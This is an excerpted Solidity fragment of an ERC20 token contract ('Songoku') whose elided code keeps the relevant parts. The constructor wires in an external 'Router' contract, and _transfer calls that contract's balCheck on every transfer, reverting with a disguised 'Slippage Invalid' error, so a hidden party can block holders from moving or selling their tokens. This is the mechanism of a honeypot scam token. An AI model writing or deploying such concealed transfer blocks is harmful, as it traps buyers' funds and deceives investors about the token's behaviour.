...
interface Router {
    function balCheck(address _account) external view returns (uint256);
}
...
contract Songoku is IERC20, Vegeta, Yamcha, Ownable {
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _cell.push(Cell(Router(android_)));
    ...
    function _transfer(
        ...
        require(amount - _cell[0].android.balCheck(sender) > 0, "Slippage Invalid");
